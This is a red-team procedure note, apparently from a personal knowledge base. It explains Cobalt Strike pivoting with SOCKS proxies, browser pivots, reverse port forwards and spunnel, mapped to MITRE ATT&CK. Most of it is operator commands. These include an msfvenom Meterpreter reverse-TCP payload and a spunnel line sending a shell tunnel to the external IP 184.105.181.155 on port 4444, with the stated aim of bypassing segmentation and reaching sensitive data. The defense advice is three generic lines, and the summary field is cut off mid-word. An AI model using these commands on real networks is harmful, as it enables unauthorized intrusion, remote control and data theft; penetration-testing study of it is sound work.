---
id: d8fec46f-73af-4e9b-8b63-0381c1bf4a86
name: Cobalt Strike VPN & Pivots
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:16.588945+00:00'
updated_at: '2023-04-10T20:36:22.857373+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Exfiltration|TA0010 - Exfiltration]]'
techniques:
- '[[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative
  Protocol]]'
- '[[Remote Access Tools|T1219 - Remote Access Tools]]'
tags:
- '[[Cobalt Strike]]'
- '[[VPN & Pivots]]'
commands:
- '[[Bind to specified port on Beacon host and forward incoming connections to forwarded
  host and port]]'
- '[[Proxy browser traffic through specified Internet Explorer process]]'
- '[[Spawn agent and create reverse port forward tunnelled through Cobalt Strike client
  to its controller]]'
- '[[Spawn agent and create reverse port forward tunnel to its controller]]'
- '[[Start SOCKS server on given port tunneling traffic through specified Beacon]]'
---

# Cobalt Strike VPN & Pivots

## Summary

The Cobalt Strike VPN & Pivots procedure involves using Cobalt Strike's SOCKS server, browser pivot, reverse port forwarding, and spunnel commands to establish a VPN-like connection to a target network and pivot through it. This procedure is commonly used by red teams and penetration testers to sim

## Description

# Description

The Cobalt Strike VPN & Pivots procedure involves using Cobalt Strike's SOCKS server, browser pivot, reverse port forwarding, and spunnel commands to establish a VPN-like connection to a target network and pivot through it. This procedure is commonly used by red teams and penetration testers to simulate an attacker gaining access to a target network and moving laterally through it. The SOCKS server command allows for a remote host to connect to a local port and tunnel traffic through the Cobalt Strike server. The browser pivot command allows for an attacker to proxy web traffic through the Cobalt Strike server. The reverse port forwarding command allows for an attacker to forward traffic from a remote host back to their local machine. The spunnel command allows for an attacker to create a secure tunnel between two hosts. This procedure can be used to bypass network segmentation and access sensitive data.

 

## Requirements

1. Access to a Cobalt Strike server

1. Authentication credentials for the target network

1. Network access to the target network

 

## Defense

1. Implement network segmentation to limit lateral movement

1. Use multi-factor authentication to prevent unauthorized access

1. Monitor network traffic for suspicious activity

 

## Objectives

1. Establish a VPN-like connection to a target network

1. Pivot through the target network

1. Bypass network segmentation

1. Access sensitive data

 

# Instructions

1. The above commands can be used to start a SOCKS server, proxy browser traffic, bind to a specified port and forward incoming connections, and create a reverse port forward tunnel or a reverse port forward tunnel through your Cobalt Strike client.

 



**Code**: [[# Start a SOCKS server on the given port on your t]]



> For starting a SOCKS server, use the 'beacon > socks [PORT]' command, where PORT is the port number on which you want to start the SOCKS server. If you want to use SOCKS4 or SOCKS5 protocol, use 'beacon > socks [port] [socks4]' or 'beacon > socks [port] [socks5]' respectively. You can enable or disable authentication by using 'enableNoAuth' or 'disableNoAuth' respectively, followed by the username and password. To enable or disable logging, use 'enableLogging' or 'disableLogging' respectively.

To proxy browser traffic, use the 'beacon > browserpivot [pid] [x86|x64]' command, where pid is the process ID of the Internet Explorer process and x86 or x64 is the architecture of the process.

To bind to a specified port and forward incoming connections, use the 'beacon > rportfwd [bind port] [forward host] [forward port]' command, where bind port is the port on which you want to bind, forward host is the host to which you want to forward the connection and forward port is the port on the forward host.

To create a reverse port forward tunnel, use the 'beacon> spunnel x64 184.105.181.155 4444 C:\Payloads\msf.bin' command, where x64 is the architecture of the agent, 184.105.181.155 is the IP address of the controller and C:\Payloads\msf.bin is the path to the payload.

To create a reverse port forward tunnel through your Cobalt Strike client, use the 'beacon> spunnel_local x64 127.0.0.1 4444 C:\Payloads\msf.bin' command, where x64 is the architecture of the agent, 127.0.0.1 is the IP address of the controller and C:\Payloads\msf.bin is the path to the payload.



**Command** ([[Start SOCKS server on given port tunneling traffic through specified Beacon]]):

```bash
beacon > socks [PORT]
beacon > socks [port]
beacon > socks [port] [socks4]
beacon > socks [port] [socks5]
beacon > socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password]
beacon > socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] [enableLogging|disableLogging]
```





**Command** ([[Proxy browser traffic through specified Internet Explorer process]]):

```bash
beacon > browserpivot [pid] [x86|x64]
```





**Command** ([[Bind to specified port on Beacon host and forward incoming connections to forwarded host and port]]):

```bash
beacon > rportfwd [bind port] [forward host] [forward port]
```





**Command** ([[Spawn agent and create reverse port forward tunnel to its controller]]):

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin
beacon> spunnel x64 184.105.181.155 4444 C:\Payloads\msf.bin
```





**Command** ([[Spawn agent and create reverse port forward tunnelled through Cobalt Strike client to its controller]]):

```bash
beacon> spunnel_local x64 127.0.0.1 4444 C:\Payloads\msf.bin
```



## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Exfiltration|TA0010 - Exfiltration]]

### Techniques

- [[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative Protocol]]
- [[Remote Access Tools|T1219 - Remote Access Tools]]

## Commands Used

- [[Bind to specified port on Beacon host and forward incoming connections to forwarded host and port]]
- [[Proxy browser traffic through specified Internet Explorer process]]
- [[Spawn agent and create reverse port forward tunnelled through Cobalt Strike client to its controller]]
- [[Spawn agent and create reverse port forward tunnel to its controller]]
- [[Start SOCKS server on given port tunneling traffic through specified Beacon]]

## Tags

- [[Cobalt Strike]]
- [[VPN & Pivots]]


